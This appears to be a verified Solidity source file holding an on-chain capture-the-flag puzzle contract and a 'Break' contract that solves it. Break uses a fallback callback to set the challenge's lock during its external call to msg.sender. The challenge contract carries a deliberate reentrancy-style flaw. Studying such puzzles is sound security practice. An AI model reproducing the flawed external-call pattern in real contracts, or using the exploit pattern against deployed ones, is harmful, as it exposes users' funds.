/**
 *Submitted for verification at Etherscan.io on 2022-09-04
*/

pragma solidity 0.8.10;

contract Challenge{

    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}

contract Break {
    Challenge i_challenge;

    constructor(address ChallengeAddress) {
        i_challenge = Challenge(ChallengeAddress);
    }

    function exploit_me(address winner) public {
        i_challenge.exploit_me(winner);
    }

    fallback() payable external {
        i_challenge.lock_me();
    }
}